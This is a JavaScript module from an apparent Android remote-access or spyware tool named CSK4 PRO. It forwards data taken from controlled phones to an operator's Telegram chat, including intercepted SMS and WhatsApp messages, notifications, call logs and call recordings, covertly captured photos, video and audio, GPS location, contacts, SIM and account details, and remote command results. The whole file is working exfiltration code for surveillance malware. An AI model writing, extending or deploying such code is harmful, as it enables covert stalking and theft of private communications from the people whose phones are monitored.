// ============================================
// CSK4 PRO v4.0 - Telegram Bot Integration (FIXED)
// ============================================

const TelegramBot = require('node-telegram-bot-api');

// ✅ FIXED: no hardcoded fallback
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let bot = null;
let isEnabled = false;
let messageQueue = [];
let isSending = false;

const RATE_LIMIT = {
  maxPerMinute: 20,
  maxPerSecond: 1,
  sentThisMinute: 0,
  sentThisSecond: 0,
  minuteReset: Date.now(),
  secondReset: Date.now()
};

const MAX_QUEUE = 500; // ✅ prevent memory leak

function init() {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('⚠️ Telegram not configured — skipping');
    return false;
  }
  try {
    bot = new TelegramBot(BOT_TOKEN, { polling: false, webHook: false });
    isEnabled = true;
    console.log('📱 Telegram Bot initialized');
    sendMessage('🟢 <b>CSK4 Server Started</b>\n\nServer is online and ready to receive data.');
    return true;
  } catch (error) {
    console.error('❌ Telegram init failed:', error.message);
    isEnabled = false;
    return false;
  }
}

function canSend() {
  const now = Date.now();
  if (now - RATE_LIMIT.minuteReset > 60000) {
    RATE_LIMIT.sentThisMinute = 0;
    RATE_LIMIT.minuteReset = now;
  }
  if (now - RATE_LIMIT.secondReset > 1000) {
    RATE_LIMIT.sentThisSecond = 0;
    RATE_LIMIT.secondReset = now;
  }
  if (RATE_LIMIT.sentThisMinute >= RATE_LIMIT.maxPerMinute) return false;
  if (RATE_LIMIT.sentThisSecond >= RATE_LIMIT.maxPerSecond) return false;
  RATE_LIMIT.sentThisMinute++;
  RATE_LIMIT.sentThisSecond++;
  return true;
}

async function sendMessage(text, options = {}) {
  if (!isEnabled || !bot) return false;
  if (!canSend()) {
    // ✅ FIXED: cap queue
    if (messageQueue.length >= MAX_QUEUE) messageQueue.shift();
    messageQueue.push({ text, options });
    processQueue();
    return false;
  }
  try {
    await bot.sendMessage(CHAT_ID, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...options
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram send failed:', error.message);
    return false;
  }
}

async function processQueue() {
  if (isSending || messageQueue.length === 0) return;
  isSending = true;
  while (messageQueue.length > 0) {
    if (!canSend()) {
      await new Promise(r => setTimeout(r, 2000));
      continue;
    }
    const msg = messageQueue.shift();
    try {
      await bot.sendMessage(CHAT_ID, msg.text, {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...msg.options
      });
    } catch (error) {
      console.error('❌ Queue send failed:', error.message);
    }
  }
  isSending = false;
}

async function sendPhoto(photoUrl, caption = '') {
  if (!isEnabled || !bot || !canSend()) return false;
  try {
    await bot.sendPhoto(CHAT_ID, photoUrl, { caption, parse_mode: 'HTML' });
    return true;
  } catch (e) { console.error('❌ TG photo:', e.message); return false; }
}

async function sendVideo(videoUrl, caption = '') {
  if (!isEnabled || !bot || !canSend()) return false;
  try {
    await bot.sendVideo(CHAT_ID, videoUrl, { caption, parse_mode: 'HTML' });
    return true;
  } catch (e) { console.error('❌ TG video:', e.message); return false; }
}

async function sendDocument(documentUrl, caption = '') {
  if (!isEnabled || !bot || !canSend()) return false;
  try {
    await bot.sendDocument(CHAT_ID, documentUrl, { caption, parse_mode: 'HTML' });
    return true;
  } catch (e) { console.error('❌ TG doc:', e.message); return false; }
}

async function sendAudio(audioUrl, caption = '') {
  if (!isEnabled || !bot || !canSend()) return false;
  try {
    await bot.sendAudio(CHAT_ID, audioUrl, { caption, parse_mode: 'HTML' });
    return true;
  } catch (e) { console.error('❌ TG audio:', e.message); return false; }
}

async function sendLocation(lat, lng) {
  if (!isEnabled || !bot || !canSend()) return false;
  try {
    await bot.sendLocation(CHAT_ID, lat, lng);
    return true;
  } catch (e) { console.error('❌ TG loc:', e.message); return false; }
}

// ============ TEMPLATES ============
async function notifyDeviceOnline(deviceName, deviceId, model, android, battery) {
  return await sendMessage(`🟢 <b>Device Online</b>\n\n📱 <b>Name:</b> ${escapeHtml(deviceName)}\n🆔 <b>ID:</b> <code>${deviceId}</code>\n📲 <b>Model:</b> ${escapeHtml(model)}\n🤖 <b>Android:</b> ${android}\n🔋 <b>Battery:</b> ${battery}%\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyLocation(deviceName, lat, lng, accuracy) {
  const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
  return await sendMessage(`📍 <b>Location Update</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n🗺️ <b>Coords:</b> <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>\n🎯 <b>Accuracy:</b> ${accuracy ? Math.round(accuracy) + 'm' : 'N/A'}\n\n<a href="${mapsUrl}">🗺️ Open in Maps</a>\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifySMS(deviceName, from, body, senderName) {
  const displayFrom = senderName && senderName !== 'Unknown' ? `${escapeHtml(senderName)} (${from})` : from;
  return await sendMessage(`💬 <b>New SMS</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n👤 <b>From:</b> ${displayFrom}\n📝 <b>Message:</b>\n<i>${escapeHtml(body)}</i>\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyWhatsApp(deviceName, from, message) {
  return await sendMessage(`💬 <b>WhatsApp Message</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n👤 <b>From:</b> ${escapeHtml(from)}\n📝 <b>Message:</b>\n<i>${escapeHtml(message)}</i>\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyNotification(deviceName, appName, title, text) {
  return await sendMessage(`🔔 <b>Notification</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n📲 <b>App:</b> ${escapeHtml(appName)}\n📌 <b>Title:</b> ${escapeHtml(title || 'No title')}\n📝 <b>Text:</b> <i>${escapeHtml(text || 'No text')}</i>\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyCall(deviceName, number, name, type, duration) {
  const typeEmoji = { 1:'📥', 2:'📤', 3:'❌', 4:'📮', 5:'🚫', 6:'⏱️' };
  const typeText = { 1:'Incoming', 2:'Outgoing', 3:'Missed', 4:'Voicemail', 5:'Rejected', 6:'Blocked' };
  return await sendMessage(`${typeEmoji[type] || '📞'} <b>Call ${typeText[type] || 'Event'}</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n👤 <b>From:</b> ${escapeHtml(name || 'Unknown')}\n📞 <b>Number:</b> <code>${number}</code>\n⏱️ <b>Duration:</b> ${duration}s\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyContact(deviceName, name, phone, type) {
  return await sendMessage(`🆕 <b>New Contact</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n👤 <b>Name:</b> ${escapeHtml(name)}\n📞 <b>Phone:</b> <code>${phone}</code>\n📱 <b>Type:</b> ${type || 'Mobile'}\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyPhoto(deviceName, photoUrl) {
  return await sendPhoto(photoUrl, `📷 <b>Photo Captured</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyVideo(deviceName, videoUrl) {
  return await sendVideo(videoUrl, `🎥 <b>Video Recorded</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyAudio(deviceName, audioUrl) {
  return await sendAudio(audioUrl, `🎤 <b>Audio Recorded</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyCallRecording(deviceName, number, duration, audioUrl) {
  return await sendDocument(audioUrl, `🎙️ <b>Call Recording</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n📞 <b>Number:</b> <code>${number}</code>\n⏱️ <b>Duration:</b> ${duration}s\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyActivity(deviceName, type, data) {
  return await sendMessage(`📊 <b>Activity: ${type}</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n📋 <b>Data:</b> <code>${escapeHtml(JSON.stringify(data))}</code>\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyBattery(deviceName, level, isCharging) {
  const emoji = isCharging ? '🔌' : (level <= 15 ? '🔴' : '🔋');
  const status = isCharging ? 'Charging' : 'On Battery';
  return await sendMessage(`${emoji} <b>Battery Alert</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n🔋 <b>Level:</b> ${level}%\n⚡ <b>Status:</b> ${status}\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifySimInfo(deviceName, sims) {
  let simText = '';
  if (sims && sims.length > 0) {
    sims.forEach(sim => {
      simText += `\n<b>SIM ${sim.slot}:</b>\n  📞 ${sim.number || 'N/A'}\n  📡 ${sim.operator || 'N/A'}\n  📶 ${sim.networkType || 'N/A'}\n`;
    });
  }
  return await sendMessage(`📱 <b>SIM Info</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n${simText}\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyAccounts(deviceName, accounts) {
  let accText = '';
  if (accounts && accounts.length > 0) {
    accounts.forEach(acc => { accText += `\n📧 ${escapeHtml(acc.name)}\n  Type: ${acc.type}\n`; });
  }
  return await sendMessage(`👤 <b>Accounts Found</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n<b>Total:</b> ${accounts?.length || 0}\n${accText}\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyEmails(deviceName, emails) {
  let emailText = '';
  if (emails && emails.length > 0) emails.forEach(email => { emailText += `\n📧 ${escapeHtml(email)}`; });
  return await sendMessage(`📧 <b>Email Accounts</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n<b>Total:</b> ${emails?.length || 0}\n${emailText}\n⏰ ${new Date().toLocaleString()}`);
}
async function notifyCommand(deviceName, command, result) {
  return await sendMessage(`🎮 <b>Command Executed</b>\n\n📱 <b>Device:</b> ${escapeHtml(deviceName)}\n⚡ <b>Command:</b> <code>${command}</code>\n✅ <b>Result:</b> ${escapeHtml(result)}\n\n⏰ ${new Date().toLocaleString()}`);
}
async function notifySystem(title, message) {
  return await sendMessage(`🚨 <b>${escapeHtml(title)}</b>\n\n${escapeHtml(message)}\n\n⏰ ${new Date().toLocaleString()}`);
}

function escapeHtml(text) {
  if (!text) return '';
  return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function test() {
  return await sendMessage('🧪 <b>Test Message</b>\n\nCSK4 Telegram Bot is working!');
}

function getStatus() {
  return {
    enabled: isEnabled,
    hasBot: !!bot,
    chatId: CHAT_ID,
    queueLength: messageQueue.length,
    sentThisMinute: RATE_LIMIT.sentThisMinute,
    sentThisSecond: RATE_LIMIT.sentThisSecond
  };
}

module.exports = {
  init, sendMessage, sendPhoto, sendVideo, sendDocument, sendAudio, sendLocation, test, getStatus,
  notifyDeviceOnline, notifyLocation, notifySMS, notifyWhatsApp, notifyNotification,
  notifyCall, notifyContact, notifyPhoto, notifyVideo, notifyAudio, notifyCallRecording,
  notifyActivity, notifyBattery, notifySimInfo, notifyAccounts, notifyEmails,
  notifyCommand, notifySystem
};
